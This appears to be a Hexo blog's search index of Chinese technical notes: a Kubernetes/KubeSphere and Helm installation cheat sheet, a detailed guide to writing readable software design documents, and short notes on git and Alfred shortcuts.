<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2022/02/26/K8S/</url>
    <content><![CDATA[<h1 id="K8S"><a href="#K8S" class="headerlink" title="K8S"></a>K8S</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改主机名</span></span><br><span class="line">hostnamectl set-hostname k8s-master</span><br><span class="line">hostnamectl set-hostname k8s-node1</span><br><span class="line">hostnamectl set-hostname k8s-node2</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">设置时间</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">能访问github和google</span></span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.2.1 sh -</span><br><span class="line"></span><br><span class="line">chmod +x kk</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">不能访问github和google</span></span><br><span class="line">export KKZONE=cn</span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.2.1 sh -</span><br><span class="line"><span class="meta"># </span><span class="language-bash">在您下载 KubeKey 后，如果您将其传至新的机器，且访问 Googleapis 同样受限，在您执行以下步骤之前请务必再次执行 <span class="built_in">export</span> KKZONE=cn 命令。</span></span><br><span class="line">chmod +x kk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./kk create config --with-kubernetes v1.21.5 --with-kubesphere v3.2.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./kk create cluster -f config-sample.yaml</span><br><span class="line"></span><br><span class="line">yum install conntrack</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">启用kubect自动补全</span></span><br><span class="line">yum install bash-completion</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Source the completion script <span class="keyword">in</span> your ~/.bashrc file</span></span><br><span class="line">echo &#x27;source &lt;(kubectl completion bash)&#x27; &gt;&gt;~/.bashrc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Add the completion script to the /etc/bash_completion.d directory</span></span><br><span class="line">kubectl completion bash &gt;/etc/bash_completion.d/kubectl</span><br></pre></td></tr></table></figure>



<h2 id="下载helm"><a href="#下载helm" class="headerlink" title="下载helm"></a>下载helm</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export version=v3.6.3</span><br><span class="line"><span class="meta">#</span><span class="language-bash">从华为开源镜像站下载</span></span><br><span class="line">curl -LO https://repo.huaweicloud.com/helm/$&#123;version&#125;/helm-$&#123;version&#125;-linux-amd64.tar.gz</span><br><span class="line">tar -zxvf helm-$&#123;version&#125;-linux-amd64.tar.gz</span><br><span class="line">mv linux-amd64/helm /usr/local/bin/helm</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Design Doc Readability</title>
    <url>/2021/12/21/Chaos/Design%20Doc%20Readability/</url>
    <content><![CDATA[<h1 id="Design-Doc-Readability"><a href="#Design-Doc-Readability" class="headerlink" title="Design Doc Readability"></a>Design Doc Readability</h1><p><a href="https://to.woa.com/read-dd">https://to.woa.com/read-dd</a></p>
<h1 id="What-is-a-Design-Doc"><a href="#What-is-a-Design-Doc" class="headerlink" title="What is a Design Doc?"></a><strong>What is a Design Doc?</strong></h1><p>设计文档是对一个技术问题的解决方案的系统性描述。</p>
<h1 id="Why-writing-Design-Docs"><a href="#Why-writing-Design-Docs" class="headerlink" title="Why writing Design Docs?"></a><strong>Why writing Design Docs?</strong></h1><ul>
<li>是否有必要花费前期时间来增加正确设计软件的确定性？</li>
<li>与此相关的是，由于高级工程师无法确保能够审核每一次代码变更，让他们参与设计是否有帮助？</li>
<li>软件设计是模棱两可的，甚至是有争议的，因而围绕设计文档在组织上达成共识是有价值的？</li>
<li>我的团队是否会忽略设计中的隐私性、安全性、日志记录或其它交叉问题？</li>
<li>是否有必要写一份文档来对组织中有关遗留系统的设计问题提供高层次的见解？</li>
</ul>
<p>通过设计文档，我们可以：</p>
<ul>
<li><p>在可以低成本迭代的时候，尽早发现设计中的问题</p>
</li>
<li><ul>
<li>设计左移，代价左移</li>
</ul>
</li>
<li><p>在团队中对设计达成一致</p>
</li>
<li><ul>
<li>设计的本质是取舍(tradeoff)。几乎所有的架构设计决策都会被挑战，原因之一是读者并非对所有的取舍都知晓并与作者达成共识。将 pros&#x2F;cons 通过设计文档清晰地列出取舍，有利于帮助读者了解（并认可）你的决策思路，可以减少被挑战的可能。</li>
</ul>
</li>
<li><p>将资深工程师的经验和思想扩展到整个团队，帮助团队成长</p>
</li>
<li><ul>
<li>作为作者，可以供资浅工程师学习</li>
<li>作为读者，可以审核资浅工程师的设计并提供建议</li>
</ul>
</li>
<li><p>形成团队软件设计的一致方式，沉淀团队&#x2F;公司技术积累</p>
</li>
<li><ul>
<li>企业的生命力在于知识价值的积累</li>
</ul>
</li>
</ul>
<p>设计文档是需要编写成本的。 如果问题的解决方案非常清晰，没有明确的取舍，设计文档中基本都是实现描述，则应该省略设计文档而直接实现。换言之，如果编写设计文档的时间主要消耗在“写”而不是在“思考”上，则这个设计文档可省略。</p>
<h1 id="Why-call-it-Readability"><a href="#Why-call-it-Readability" class="headerlink" title="Why call it Readability?"></a><strong>Why call it Readability?</strong></h1><h3 id="设计文档的读写比最高"><a href="#设计文档的读写比最高" class="headerlink" title="设计文档的读写比最高"></a><strong>设计文档的读写比最高</strong></h3><p>设计文档 &gt; API &gt; 代码</p>
<p>设计文档用来被读的时间往往远多于写的时间。因此，编写设计文档时更应该考虑读者的体验而非作者的体验。</p>
<h3 id="设计文档不是文学写作"><a href="#设计文档不是文学写作" class="headerlink" title="设计文档不是文学写作"></a><strong>设计文档不是文学写作</strong></h3><p>设计文档的目的是为了沟通设计，而不是为了自我表达。</p>
<p>把精力放在如何清晰、简洁地表达，而非放在文采上。</p>
<h3 id="为读者而写"><a href="#为读者而写" class="headerlink" title="为读者而写"></a><strong>为读者而写</strong></h3><p>首先，了解你的读者。</p>
<p>读者群体是谁？</p>
<p> 读者不应该只是你的 TL 以及该设计文档的实施者； 你的设计文档真正受众的范围往往大得多。在不确定的时候，经验做法是，假设的读者群体为：公司内部的、有一定工程经验的、但对该系统的上下文只有初步了解的软件工程师。</p>
<p>通常，设计文档的范围越大，假定的受众群也会更大，也就意味着受众对目标系统的平均了解程度更低，也就意味着设计文档往往需要：</p>
<ul>
<li>更加详细的背景介绍</li>
<li>更少使用内部术语或缩写</li>
<li>更多阐述设计思路、取舍，更少解释具体实现细节</li>
</ul>
<p>读者如何阅读？ </p>
<p>大部分读者不会逐字逐句阅读你的设计文档。大家都很忙。 读者通常只会扫描大体结构，然后阅读自己感兴趣的部分。 </p>
<h3 id="设计文档-VS-代码-Readability"><a href="#设计文档-VS-代码-Readability" class="headerlink" title="设计文档 VS 代码 Readability"></a><strong>设计文档 VS 代码 Readability</strong></h3><ul>
<li>着重强调的内容应该是并非显而易见的事项：</li>
</ul>
<table>
<thead>
<tr>
<th><strong>设计文档</strong></th>
<th><strong>代码文档</strong></th>
</tr>
</thead>
<tbody><tr>
<td>背景</td>
<td>上下文</td>
</tr>
<tr>
<td>强调 Why&#x2F;权衡&#x2F;其它方案</td>
<td>强调 “Why” 动机</td>
</tr>
<tr>
<td>注意事项</td>
<td>注意事项</td>
</tr>
<tr>
<td>代码可以清晰表达的内容不需要文档</td>
<td>代码可以清晰表达的内容不需要文档</td>
</tr>
</tbody></table>
<ul>
<li><p>没有绝对的正确答案：没有完美的代码，也没有完美的设计文档。</p>
</li>
<li><ul>
<li>不同的读者对可读性的理解有细微的不同。 可读性是主观的。</li>
<li>在实践中，我们追求让更多（而非所有）读者更顺畅地阅读设计文档。</li>
</ul>
</li>
<li><p>我们的目标是有意识地提高文档写作&#x2F;代码水平。高质量的写作是一种习惯。</p>
</li>
<li><ul>
<li>多读</li>
<li>评审 （Design doc review&#x2F;Code review）有益</li>
<li>多写</li>
</ul>
</li>
</ul>
<h2 id="为读者而写-1"><a href="#为读者而写-1" class="headerlink" title="为读者而写"></a>为读者而写</h2><p>要了解读者画像</p>
<p>大部分读者不会很详细的读，得让读者在短时间内了解整体思想</p>
<h1 id="Core-Principles"><a href="#Core-Principles" class="headerlink" title="Core Principles"></a><strong>Core Principles</strong></h1><h3 id="写作风格的三要素"><a href="#写作风格的三要素" class="headerlink" title="写作风格的三要素"></a><strong>写作风格的三要素</strong></h3><ul>
<li>清晰</li>
<li>简洁</li>
<li>优雅</li>
</ul>
<h3 id="设计的要点"><a href="#设计的要点" class="headerlink" title="设计的要点"></a><strong>设计的要点</strong></h3><h4 id="任何架构问题都是取舍。"><a href="#任何架构问题都是取舍。" class="headerlink" title="任何架构问题都是取舍。"></a><strong>任何架构问题都是取舍。</strong></h4><p>Everything in software architecture is a tradeoff.</p>
<p>在软件设计中，没有任何一个维度有绝对意义上的优劣。 每一个设计决定都需要考量很多相违背的因素。</p>
<p>例如，可扩展性和效率相背； 长期效率和短期收益相背；规模化提升了效率，但降低了灵活性。“高内聚低耦合” 便于迭代，但是会增加短期的开发成本。 NoSQL 比 SQL 性能高，但代价是功能的大幅降低。</p>
<p>如果一个设计决策看上去没有任何的取舍，往往是因为取舍还没有被识别。</p>
<h4 id="“为什么”-比-“怎么做”-更重要。"><a href="#“为什么”-比-“怎么做”-更重要。" class="headerlink" title="“为什么” 比 “怎么做” 更重要。"></a><strong>“为什么” 比 “怎么做” 更重要。</strong></h4><p>WHY is more important than HOW.</p>
<h4 id="考虑时间维度"><a href="#考虑时间维度" class="headerlink" title="考虑时间维度"></a><strong>考虑时间维度</strong></h4><p>Software Engineering &#x3D; Codng * Time.</p>
<p>做设计取舍时需要考虑可维护性、可扩展性。 考虑未来计划。</p>
<h4 id="避免过度设计"><a href="#避免过度设计" class="headerlink" title="避免过度设计"></a><strong>避免过度设计</strong></h4><p>Avoid over design.</p>
<p>设计伊始，界定问题的范围。 一个良好界定的问题是一个良好设计的必要条件。</p>
<p>不要迷信设计模型、设计模式、XX 驱动设计。这些是工具，而非法则。不要为了制造问题而解决问题。不要通过复杂的设计来体现工作的难度和深度: 一个困难的问题可能会有一个简单的答案。</p>
<p>不要过于担忧设计迅速淘汰。保留可扩展性，但不要在未知时浪费精力扩展。 </p>
<p><a href="https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/">https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/</a></p>
<p><a href="https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition">https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition</a></p>
<h1 id="Design-Doc-Best-Practices"><a href="#Design-Doc-Best-Practices" class="headerlink" title="Design Doc Best Practices"></a><strong>Design Doc Best Practices</strong></h1><h2 id="遣词"><a href="#遣词" class="headerlink" title="遣词"></a><strong>遣词</strong></h2><p>用词要简练、准确、直白。</p>
<ul>
<li><p>正确使用专业术语。</p>
</li>
<li><ul>
<li><p>合理地使用常见术语可以降低沟通成本。</p>
</li>
<li><p>不要过多使用过于小众或自创的术语。如果有必要，需要在文中</p>
</li>
<li><ul>
<li>必要时提供对照的英文术语以方便理解。</li>
<li>避免无上下文的缩略词。</li>
</ul>
</li>
</ul>
</li>
<li><p>省略程度副词</p>
</li>
<li><ul>
<li>不管作者意图为何， “非常重要” 和 “重要” 在读者看来大同小异。</li>
</ul>
</li>
<li><p>使用数据</p>
</li>
<li><ul>
<li>与其说明“该系统的性能提升明显”，不如“该系统的性能提升了42%”更为可信，也更方便读者做出自己的判断。</li>
</ul>
</li>
<li><p>忌佶屈聱牙</p>
</li>
<li><ul>
<li>例如上文，应改为“不要使用过于生僻的词汇，不要过度使用书面语”</li>
<li>千万不要写文言文</li>
</ul>
</li>
</ul>
<h2 id="造句"><a href="#造句" class="headerlink" title="造句"></a><strong>造句</strong></h2><ul>
<li><p>使用短句，不要使用多从句的复杂句式。</p>
</li>
<li><ul>
<li>读者不是来考 GRE 的。</li>
<li>写文档也不是为了炫耀自己可以驾驭长难句。</li>
</ul>
</li>
</ul>
<p><em>“系统形式问题就是下面这样一个问题：怎样把各种不同的对象种类安排在一个系统中，以使较高的对象种类总能从较低的对象种类构造出来，也就是说前者可还原为后者。为了解决这个问题，我们必须从其相互可还原性来研究各种不同的对象种类。为此目的，我们要根据所涉及的对象领域的实际科学知识为每一个要考察的对象寻找其基本事实存在的充分而必要的条件的各种可能性。对此我们可采取下面的办法来进行，即要求这门实际科学给出基本事实的一个（确实而常在的）表征。”</em></p>
<p><em>Excerpt From: 【德】鲁道夫·卡尔纳普. “世界的逻辑构造.”</em> </p>
<ul>
<li><p>简单表达，去掉无意义的修饰，去掉试图缓和语气的从句。</p>
</li>
<li><ul>
<li><p>反例：“我们可以看到， TencentDB 在一定程度上可以满足我们对事务支持的需求。”</p>
</li>
<li><ul>
<li>修改后：“TencentDB 支持事务”。</li>
</ul>
</li>
<li><p>反例： “MR 提交信息作为读者查阅修改历史时第一时间看到的信息，其重要性不言而喻。”</p>
</li>
<li><ul>
<li>修改后：“读者查阅修改历史时会首先关注 MR 提交信息。”</li>
</ul>
</li>
<li><p>本段讨论另一个问题，即……</p>
</li>
</ul>
</li>
<li><p>避免过于口语化。</p>
</li>
<li><ul>
<li>不要加顺口溜</li>
<li>不要使用语气词</li>
<li>不要使用叹号！ 如果希望强调，使用<strong>粗体</strong>或者<em>斜体</em>即可！也可以使用分级标题！！！</li>
</ul>
</li>
</ul>
<p>准确</p>
<ul>
<li>描述客观事实，避免加入主观情绪。</li>
</ul>
<h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a><strong>段落</strong></h2><p>段落应该尽量短。通常，一个段落不要超过 8 个完整的句子。</p>
<p>每个段落有且仅有一个清晰的主题。每个段落开头应该是主题句，方便读者快速了解段落大意。段落中的每一句话应该与主题紧密相关； 否则，它应该另起段落，或者应该删掉。</p>
<p>注意段落的流动。段落句子应该始于一个读者已经熟悉的概念，将新的内容放在句子结尾。这样，读者可以更连贯地理解。</p>
<p>使用列表</p>
<p>使用 Bullet point 标明无顺序的列表，使用数字序号明确前后顺序。</p>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a><strong>结构</strong></h2><p>使用模板</p>
<p>使用图表</p>
<p>使用标题</p>
<p>标题要分级</p>
<p>标题要简短清晰</p>
<h2 id="篇幅"><a href="#篇幅" class="headerlink" title="篇幅"></a><strong>篇幅</strong></h2><p>设计文档不要过长。太多内容堆积在一个文档中会让读者丧失兴趣。</p>
<p>对于一个大型项目来说，10页（~5000字）左右是一个合适的长度。当超过这个长度时，可以考虑将问题拆分成子问题分别编写设计文档，并在总体设计文档中链接子设计文档。</p>
<p>对于小问题做增量的改进，考虑使用单页文档(one-pager)。通常这类文档的范围较小，解决问题较简单，目标用户群体仅限于对问题已经有充分了解的内部成员。这时，可以省略背景等内容，而仅使用 目标 – 方案 两段式论证的结构。</p>
<h2 id="排版"><a href="#排版" class="headerlink" title="排版"></a><strong>排版</strong></h2><p>使用统一的字体。 用户不会意识到不同的字体代表不同的含义，只会感受到混乱。</p>
<p>微软雅黑是安全选择。</p>
<p>不要使用不同颜色来区分内容。不要在文中使用超过三种颜色。 可以在标题及分级标题使用标志性的颜色，同时正文使用黑色。</p>
<h1 id="Design-Doc-Template"><a href="#Design-Doc-Template" class="headerlink" title="Design Doc Template"></a><strong>Design Doc Template</strong></h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a><strong>目标</strong></h2><p>“我们要解决什么问题？”</p>
<p>用几句话说明该设计文档的关键系统目的，让读者能够一眼得知自己是否对该设计文档感兴趣。</p>
<p>如：</p>
<p>“本文描述 Spanner 的顶层设计”</p>
<p>继而，使用 Bullet Points 描述该设计试图达到的重要目标，如：</p>
<ul>
<li>可扩展性</li>
<li>多版本</li>
<li>全球分布</li>
<li>同步复制</li>
</ul>
<p>非目标也可能很重要。</p>
<p>非目标并非单纯目标的否定形式，也不是与解决问题无关的其它目标，而是一些可能是读者非预期的、本可作为目标但并没有的目标，如：</p>
<ul>
<li>高可用性</li>
<li>高可靠性</li>
</ul>
<p>如果可能，解释是基于哪些方面的考虑将之作为非目标。如：</p>
<ul>
<li>可维护性： 本服务只是过渡方案，预计寿命三个月，待 XX 上线运行后即可下线</li>
</ul>
<p>设计不是试图达到完美，而是试图达到平衡。 显式地声明哪些是是目标，哪些是非目标，有助于帮助读者理解下文中设计决策的合理性，同时也有助于日后迭代设计时，检查最初的假设是否仍然成立。</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h2><p>“我们为什么要解决这个问题？”</p>
<p>为设计文档的目标读者提供理解详细设计所需的背景信息。</p>
<p>按读者范围来提供背景。见上文关于目标读者的圈定。</p>
<p>设计文档应该是是“自足的”（self-contained），即应该为读者提供足够的背景知识，使其无需进一步的查阅资料即可理解后文的设计。</p>
<p>保持简洁，通常以几段为宜，每段简要介绍即可。如果需要向读者提供进一步的信息，最好只提供链接。</p>
<p>警惕知识的诅咒。 <strong>知识的诅咒</strong>（Curse of knowledge）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AA%8D%E7%9F%A5%E5%81%8F%E5%B7%AE">认知偏差</a>，指人在与他人交流的时候，下意识地假设对方拥有理解所需要的背景知识。</p>
<p>背景通常可以包括：</p>
<ul>
<li><p>需求动机以及可能的例子。 如，“（tRPC) 微服务模式正在公司内变得流行，但是缺少一个通用的、封装了常用内部工具及服务接口的微服务框架”。</p>
</li>
<li><ul>
<li>这是放置需求文档的链接的好地方。</li>
</ul>
</li>
<li><p>此前的版本以及它们的问题。 如，“(tRPC) Taf 是之前的应用框架， 有以下特点，…………， 但是有以下局限性及历史遗留问题”。</p>
</li>
<li><p>其它已有方案， 如公司内其它方案或开源方案， “tRPC vs. gRPC vs. Stubby”</p>
</li>
<li><p>相关的项目，如 “tRPC 框架中可能会对接的其它 PCG 系统”</p>
</li>
</ul>
<p>不要在背景中写你的设计，或对问题的解决思路。 </p>
<h2 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a><strong>总体设计</strong></h2><p>“我们如何解决这个问题？”</p>
<p>用一页描述高层设计。</p>
<p>说明系统的主要组成部分，以及一些关键设计决策。该系统应有对应的模块或努力以满足前面所列出的目标。</p>
<p>本设计文档的评审人应该能够根据该总体设计理解你的设计思路并做出评价。</p>
<p>描述应该对一个新的、不在该项目工作的腾讯工程师而言是可以理解的。</p>
<p>推荐使用 <a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%85%B3%E7%B3%BB%E5%9B%BE">系统关系图</a> 描述设计。它可以使读者清晰地了解文中的新系统和已经熟悉的系统间的关系。它也可以包含新系统内部概要的组成模块。</p>
<p>注意：不要只放一个图而不做任何说明，请根据上面小节的要求用文字描述设计思想。</p>
<p>​        <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114819.png" alt="img"></p>
<p>​                 <img src="https://docimg1.docs.qq.com/image/A94XO50A_ONl4b8m_1iZug.png?w=640&h=325" alt="img">        </p>
<p>一个示例系统关系图</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114561.png" alt="image-20211027153643534"></p>
<p>自举的文档结构图</p>
<p>​                 <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212115526.png" alt="img">        </p>
<p>可能不太好的顶层设计</p>
<p>不要在这里描述细节，放在下一章节中； 不要在这里描述背景，放在上一章节中。</p>
<h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a><strong>详细设计</strong></h2><p>在这一节中，除了介绍设计方案的细节，还应该包括在产生最终方案过程中，主要的设计思想及考虑过的权衡（tradeoff）。这一节的结构和内容因设计对象（系统，API，流程等）的不同可以自由决定，可以划分一些小节来更好地组织内容，尽可能以简洁明了的结构阐明整个设计。</p>
<p>不要过多写实现细节。就像我们不推荐添加只是为了说明代码做了什么的注释，我们也不推荐在设计文档中只说明你具体要怎么实现该系统。否则，为什么不直接实现呢？</p>
<p>以下内容可能是实现细节例子，不适合在设计文档中讨论：</p>
<ul>
<li>API 的所有细节</li>
<li>存储系统的 Data Schema</li>
<li>具体代码或伪代码</li>
<li>该系统各模块代码的存放位置、各模块代码的布局</li>
<li>该系统使用的编译器版本</li>
<li>开发规范</li>
</ul>
<p>通常可以包含以下内容（注意，小节的命名可以更改为更清晰体现内容的标题）：</p>
<h3 id="各子模块的设计"><a href="#各子模块的设计" class="headerlink" title="各子模块的设计"></a><strong>各子模块的设计</strong></h3><p>阐明一些复杂模块内部的细节，可以包含一些模块图、流程图来帮助读者理解。可以借助时序图进行展现，如一次调用在各子模块中的运行过程。</p>
<p>每个子模块需要说明自己存在的意义。如无必要，勿添模块。</p>
<p>如果没有特殊情况（例如该设计文档是为了描述并实现一个核心算法），不要在系统设计加入代码或者伪代码。</p>
<h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a><strong>API接口</strong></h3><p>如果设计的系统会暴露 API 接口，那么简要地描述一下API会帮助理解系统的边界。</p>
<p>避免将整个接口复制粘贴到文档中，因为在特定编程语言中的接口通常包含一些语言细节而显得冗长，并且有一些细节也会很快变化。着重表现API接口跟设计最相关的主要部分即可。</p>
<h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a><strong>存储</strong></h3><p>介绍系统依赖的存储设计。该部分内容应该回答以下问题，如果答案并非显而易见：</p>
<ul>
<li><p>该系统对数据&#x2F;存储有哪些要求？ </p>
</li>
<li><ul>
<li>该系统会如何使用数据？</li>
<li>数据是什么类型的？</li>
<li>数据规模有多大？</li>
<li>读写比是多少？读写频率有多高？</li>
<li>对可扩展性是否有要求？</li>
<li>对原子性要求是什么？</li>
<li>对一致性要求是什么？是否需要支持事务？</li>
<li>对可用性要求是什么？</li>
<li>对性能的要求是什么？</li>
<li>…………</li>
</ul>
</li>
<li><p>基于上面的事实，数据库应该如何选型？</p>
</li>
<li><ul>
<li>选用关系型数据库还是非关系型数据库？是否有合适的中间件可以使用？</li>
<li>如何分片？是否需要分库分表？是否需要副本？</li>
<li>是否需要异地容灾？</li>
<li>是否需要冷热分离？</li>
<li>…………</li>
</ul>
</li>
</ul>
<p>如果是关系型数据，可以借助<a href="https://zh.wikipedia.org/wiki/ER%E6%A8%A1%E5%9E%8B">ER图</a>的方式展现数据间的关系。</p>
<p>回答上述问题时，尽可能提供数据，将数据作为答案或作为辅助。 不要回答“数据规模很大，读写频繁”，而是回答“预计数据规模为 300T， 3M 日读出， 0.3M 日写入， 巅峰 QPS 为 300”。这样才能为下一步的具体数据库造型提供详细的决策依据，并让读者信服。</p>
<p>注意：在造型时也要包括可能会造成显著影响的非技术因素，如费用。</p>
<p>避免将所有数据定义（data schema）复制粘贴到文档中，因为 data schema 更偏实现细节。</p>
<h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a><strong>其他方案</strong></h2><p>“我们为什么不这么解决这个问题？”</p>
<p>在介绍了最终方案后，可以有一节介绍一下设计过程中考虑过的其他设计方案（Alternatives Considered）、它们各自的优缺点和权衡点、以及导致选择最终方案的原因等。通常，有经验的读者（尤其是方案的审阅者）会很自然地想到一些其他设计方案，如果这里的介绍描述了没有选择这些方案的原因，就避免读者带着疑问看完整个设计再来询问作者。这一节可以体现设计的严谨性和全面性。</p>
<h2 id="交叉关注点"><a href="#交叉关注点" class="headerlink" title="交叉关注点"></a><strong>交叉关注点</strong></h2><h3 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a><strong>基础设施</strong></h3><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a><strong>安全</strong></h3><h3 id="隐私"><a href="#隐私" class="headerlink" title="隐私"></a><strong>隐私</strong></h3><h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a><strong>延迟</strong></h3><h3 id="冗余-amp-可靠性"><a href="#冗余-amp-可靠性" class="headerlink" title="冗余 &amp; 可靠性"></a><strong>冗余 &amp; 可靠性</strong></h3><p>是否需要容灾？是否需要过载保护、有损降级、接口熔断、轻重分离？</p>
<h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a><strong>数据完整性</strong></h3><h2 id="实现计划"><a href="#实现计划" class="headerlink" title="实现计划"></a><strong>实现计划</strong></h2><p>描述时间及人力安排，如里程碑。 这利于相关人员了解预期，调整工作计划。</p>
<h2 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a><strong>未来计划</strong></h2><p>未来可能的计划会方便读者更好地理解该设计以及其定位。</p>
<p>我们确实应该把设计限定在当前问题，但是该设计可能是更高层系统所要解决问题的一部分，或者只是阶段性方案。 读者可能会对方案的完整性有所疑问，会质疑到底问题是否得到完整解决，甚至会质疑该问题在更高层的系统中是否确实值得解决。 “背景（过去）– 当前方案 – 未来计划” 三者的结合会为读者提供更好的全景图。</p>
<h1 id="附录：-参考文献"><a href="#附录：-参考文献" class="headerlink" title="附录： 参考文献"></a><strong>附录： 参考文献</strong></h1><p>参考文档：</p>
<ul>
<li><a href="https://km.woa.com/group/40176/articles/show/440739?from=iSearch">如何编写软件工程设计文档</a> </li>
<li><a href="https://www.industrialempathy.com/posts/design-docs-at-google/">Design Docs at Google</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFNzc05YelNhZldx">模板] 设计文档模板</a></li>
<li>[<a href="https://docs.qq.com/doc/DUWlxc1pmdllZeEtL">示例] 视频关系网络工程设计文档</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFduSnV4RmhIZHB5">示例] 视频后台组件平台-总体设计</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">示例] Unionplus K-List存储设计替代方案</a></li>
<li><a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">Unionplus K-List存储设计替代方案</a><a href="https://www.chromium.org/developers/design-documents">chromium 设计文档实例</a></li>
</ul>
<p>参考书籍：</p>
<ul>
<li><a href="https://book.douban.com/subject/20062380/">Style</a>, <em>Joseph M. Williams &#x2F; Joseph Bizup</em></li>
<li><a href="https://book.douban.com/subject/1020644/">金字塔原理 : 思考、写作和解决问题的逻辑</a>, <em>巴巴拉·明托</em></li>
<li><a href="https://book.douban.com/subject/3888123/">写作这回事</a>，<em>斯蒂芬·金</em></li>
<li><a href="https://book.douban.com/subject/1433835/">The elements of style,</a> <em>William Strunk Jr. &#x2F; E. B. White</em></li>
<li><a href="https://www.goodreads.com/en/book/show/44144493-fundamentals-of-software-architecture">Fundamentals of Software Architecture</a>, <em>Mark Richards &#x2F; Neal Ford</em></li>
<li><a href="https://book.douban.com/subject/34875994/">Software engineering at Google</a>, <em>Titus Winters &#x2F; Tom Manshreck &#x2F; Hyrum K. Wright</em></li>
<li><a href="https://book.douban.com/subject/35143751/">写作是门手艺</a>，<em>刘军强</em></li>
</ul>
]]></content>
      <categories>
        <category>设计文档</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/02/26/Chaos/Chaos/</url>
    <content><![CDATA[<h1 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h1><p><code>tee</code>则来自于<code>T</code>,是管线工人的术语，代表T型的管线分叉器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push --set-upstream origin master</span><br><span class="line">有了这行命令就可以不用在git push 后面加origin master了</span><br></pre></td></tr></table></figure>



<h2 id="Alfred-4"><a href="#Alfred-4" class="headerlink" title="Alfred 4"></a>Alfred 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">应用搜索</span></span><br><span class="line">输入应用名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">文件或目录搜索</span></span><br><span class="line">find 文件名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">文本内容搜索 列出磁盘中包含该文本的相关文件</span></span><br><span class="line">in 待搜索的文本</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">标记搜索 输入 tags 命令，以及待搜索的标记颜色中文名称，列出打上相应标记的目录，可以快速定位标记目录。</span></span><br><span class="line">tags 灰色</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">快捷搜索 可以自定义常用的网页搜索</span></span><br><span class="line">google 待搜索的内容</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">书签搜索 在浏览器的大量书签中快速搜索。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">剪切板搜索</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">系统常用命令快捷操作</span></span><br><span class="line">通过 alfred 可以快捷地操作系统锁屏、关机、重启、休眠等十几种指令，非常便捷。对于强迫症用户来说，唤起屏保、休眠、清空垃圾篓、退出应用等指令可能较为常用。</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">自定义工作流</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>掘金搜索：<code>alfred://customsearch/Search%20Juejin%20for%20%27%7Bquery%7D%27/jj/utf8/nospace/https%3A%2F%2Fjuejin.im%2Fsearch%3Ftype%3Dall%26query%3D%7Bquery%7D</code></li>
